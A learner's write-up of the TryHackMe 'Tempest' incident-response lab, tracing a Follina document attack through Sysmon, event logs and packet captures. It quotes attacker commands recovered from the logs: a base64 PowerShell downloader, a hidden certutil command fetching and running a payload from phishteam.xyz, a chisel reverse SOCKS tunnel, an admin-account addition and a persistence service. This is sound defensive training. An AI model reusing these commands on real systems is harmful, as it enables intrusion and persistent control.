# 🛡️ Tempest - Full Attack Chain Investigation: TryHackMe Lab

<p align="center">
  <img src="https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Type-Incident%20Response-orange?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Role-SOC%20Analyst%20Tier%201-blue?style=for-the-badge"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/tinicio.jpg" width="700"/>
</p>

**Room link:** [tryhackme.com/room/tempestincident](https://tryhackme.com/room/tempestincident)

---

## 📌 About This Lab

An alert came in from the SOC with CRITICAL severity: a user opened a malicious Word document, and it snowballed from there. This room hands over three artefacts (a packet capture, a Sysmon log, and a Windows Event log) and asks the analyst to reconstruct the entire attack chain, from that first click all the way to the attacker having full administrative control of the machine.

**Tools used:** EvtxECmd, Timeline Explorer, SysmonView, Event Viewer, Wireshark, Brim, CyberChef, VirusTotal

**Objectives:**
- Verify artefacts by hash before starting the investigation
- Trace initial access from a malicious document to code execution
- Follow a stage 2 payload download and its C2 traffic
- Identify discovery, privilege escalation, and persistence techniques
- Reconstruct the full attack timeline from endpoint and network logs together

---

## 🔑 Key Concepts

| Concept | Description |
|---|---|
| **Log Analysis** | Reading through system-generated events (with timestamps) to spot anomalies, security threats, or signs of an attack |
| **Event Correlation** | Connecting related events across different log sources (Sysmon, Windows Event Logs, packet captures) using shared details like IP, port, process, or user, to build the full picture |
| **Hash Verification** | Checking a file's SHA256 hash before investigating it, a simple way to confirm the artefact is exactly what it's supposed to be |
| **LOLBins** | Legitimate system tools (like `certutil.exe`) that get abused by attackers to blend in with normal activity |

---

## 🔍 Investigation

### Setup: Verifying the Artefacts

**Q: What are the SHA256 hashes of capture.pcapng, sysmon.evtx, and windows.evtx?**

**Method:** Opened PowerShell, navigated to the Incident Files folder, and ran `Get-FileHash -Algorithm SHA256` on each file.

> **Answer:** `capture.pcapng`: `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`, `sysmon.evtx`: `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`, `windows.evtx`: `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t1.jpg" width="700"/>
</p>

---

### Stage 1: Initial Access, the Malicious Document

**Q: What is the file name of the malicious document?**

**Method:** Knowing the user downloaded it through Chrome, filtered Timeline Explorer for `chrome.exe`.

> **Answer:** `free_magicules.doc`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t2.jpg" width="700"/>
</p>

**Q: What is the name of the compromised user and machine?**

**Method:** Filtered by the document's file extension to see the surrounding log entries.

> **Answer:** `benimaru-TEMPEST`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t3.jpg" width="700"/>
</p>

**Q: What is the PID of the Microsoft Word process that opened the document?**

**Method:** Filtered for the document's file name in the process logs.

> **Answer:** `496`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t4.jpg" width="700"/>
</p>

**Q: What malicious domain did the document reach out to?**

**Method:** Filtered again around the Chrome/Word activity and spotted an unfamiliar, suspicious-looking domain.

> **Answer:** `phishteam.xyz`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t5.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t6.jpg" width="700"/>
</p>

**Q: What is the base64 encoded string in the malicious payload executed by the document?**

**Method:** Searched for "base64" in the logs and pulled the string straight from the executable's command-line info.

> **Answer:** `JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t7.jpg" width="700"/>
</p>

**Q: What is the CVE number of the exploit used to achieve remote code execution?**

**Method:** Copied a distinctive part of the code from the document and searched it directly.

> **Answer:** `CVE-2022-30190` (the "Follina" MSDT vulnerability)

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t8.jpg" width="700"/>
</p>

---

### Stage 2: Execution

**Q: What is the full target path where the payload wrote a file on the system?**

**Method:** Took the base64 string from the previous step, decoded it in CyberChef, and confirmed the path in the decoded script.

> **Answer:** `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t9.jpg" width="700"/>
</p>

**Q: What command executes once the compromised user logs in?**

**Method:** That startup folder is a classic persistence spot, whatever's dropped there runs automatically on every login. Found the exact command tied to it.

> **Answer:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t10.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t11.jpg" width="700"/>
</p>

**Q: What is the SHA256 hash of first.exe?**

> **Answer:** `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t12.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t13.jpg" width="700"/>
</p>

**Q: What domain and port does the stage 2 payload use to reach its C2 server?**

**Method:** Searched by the `first.exe` file name and found a second domain, `resolvecyber.xyz`, resolving to `167.71.222.162`. Timeline Explorer didn't show the port directly, so switched to Wireshark, filtered on that IP, and found it there.

> **Answer:** `resolvecyber.xyz`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t14.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t15.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t16.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t17.jpg" width="700"/>
</p>

---

### Malicious Document Traffic

**Q: What is the URL of the malicious payload embedded in the document?**

**Method:** Used the Brim filter `_path=="http" "phishteam"` to pull up all HTTP traffic to that domain.

> **Answer:** `http://phishteam.xyz/02dcf07/index.html`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t18.jpg" width="700"/>
</p>

**Q: What encoding does the attacker use on the C2 connection? What HTTP method does the binary use? What is the URL it calls for its next command?**

**Method:** Filtered on the second domain (`resolvecyber.xyz`) in Brim, copied a request URL into CyberChef, and after trimming the query string prefix, confirmed it decoded cleanly as base64.

> **Answer:** Encoding: `base64`, method: `GET`, URL: `/9ab62b5`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t19.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t20.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t21.jpg" width="700"/>
</p>

**Q: What parameter carries the executed command's results?**

> **Answer:** `q`

**Q: Based on the User-Agent, what language was the C2 binary written in?**

**Method:** Checked the User-Agent string and searched it to confirm.

> **Answer:** `Nim`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t22.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t23.jpg" width="700"/>
</p>

---

### Discovery: Internal Reconnaissance

**Q: The attacker found a sensitive file with a password inside. What is that password?**

**Method:** Used the room's Brim filter for the C2 traffic, then decoded each URL, one by one, in CyberChef until one revealed the password.

> **Answer:** `Infernotempest`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t24.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t25.jpg" width="700"/>
</p>

**Q: The attacker enumerated listening ports. Which one could provide a remote shell?**

**Method:** Searched for which port is commonly associated with remote shell access.

> **Answer:** `5985` (WinRM's default port)

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t26.jpg" width="700"/>
</p>

**Q: What command did the attacker run to set up a reverse socks proxy?**

**Method:** Searched Timeline Explorer for the word "socks".

> **Answer:** `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t27.jpg" width="700"/>
</p>

**Q: What is the SHA256 hash of that binary, and what tool is it based on the hash?**

**Method:** Took the hash and checked it against VirusTotal.

> **Answer:** `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`, identified as `chisel`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t28.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t29.jpg" width="700"/>
</p>

**Q: What service did the attacker use to authenticate with the harvested credentials?**

> **Answer:** `WinRM`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t30.jpg" width="700"/>
</p>

---

### Privilege Escalation

**Q: The attacker downloaded another binary for privilege escalation. What is its name and hash?**

**Method:** Filtered around the compromised site and found a suspicious parent process (`wsmprovhost.exe`), then traced the binary it spawned.

> **Answer:** `spf.exe`, `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t31.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t32.jpg" width="700"/>
</p>

**Q: Based on that hash, what tool is this?**

**Method:** Checked the hash on VirusTotal.

> **Answer:** `PrintSpoofer`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t33.jpg" width="700"/>
</p>

**Q: What privilege does the tool exploit? What binary did the attacker run alongside it to get a new C2 connection, and on what port?**

**Method:** Searched for what privilege PrintSpoofer specifically abuses, then traced the follow-up binary and its traffic.

> **Answer:** Privilege: `SeImpersonatePrivilege`, binary: `final.exe`, port: `8080`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t34.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t35.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t36.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t37.jpg" width="700"/>
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t38.jpg" width="700"/>
</p>

---

### Actions on Objectives: Fully-Owned Machine

**Q: The attacker created two new accounts. What are their names?**

**Method:** Filtered Timeline Explorer for account "add" activity.

> **Answer:** `shion`, `shuna`

**Q: An earlier account creation attempt failed. What option was missing?**

> **Answer:** `/add`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t39.jpg" width="700"/>
</p>

**Q: What Windows Event ID confirms the account creation? What command added an account to the local administrators group? What Event ID confirms that group addition?**

> **Answer:** Account creation: Event ID `4720`, command: `net localgroup administrators /add shion`, group addition: Event ID `4732`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t40.jpg" width="700"/>
</p>

**Q: What command did the attacker run to set up persistent administrative access?**

**Method:** The attacker used `sc.exe` to create a fake auto-start service that runs the malware binary every time the machine boots.

> **Answer:** `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto`

<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/t41.jpg" width="700"/>
</p>

---

## 🧠 What I Learned

- How to reconstruct a full attack chain end to end, malicious document, exploit, stage 2 download, C2 traffic, discovery, privilege escalation, and persistence, by following the trail one artefact at a time
- How to correlate the same event across three data sources (Sysmon, Windows Event Logs, packet capture) instead of relying on just one
- How to decode and read attacker C2 traffic in CyberChef when a URL doesn't make sense on its own
- Recognizing known tools by their SHA256 hash through VirusTotal 
- How attackers set up persistence in more than one way in the same intrusion, a startup folder script early on, then a fake Windows service later once they had full control

---

## 💬 Honest Self-Assessment

**What I need to improve:**
A lot of my answers in this room came from searching online (the CVE number, the port for remote shells, the tool behind a hash, the meaning of specific Windows Event IDs) rather than knowing them from memory. This is one of the most technical rooms I've done, and it showed me how much of this knowledge (common ports, common privilege escalation tools, key Event IDs) I still need to memorize so I'm not looking each one up mid-investigation.

---
<p align="center">
  <img src="https://raw.githubusercontent.com/frankllin-sec/Labs-experience/main/Tempest/Screenshots/tfinal.jpg" width="700"/>
</p>

<p align="center">
  <i>"Stay sharp, stay curious, stay secure."</i> 🔐
</p>
<p align="center">Thank you for visiting! 🙏</p>
<p align="center">Made with 🛡️ by <a href="https://github.com/frankllin-sec">Frankllin</a></p>
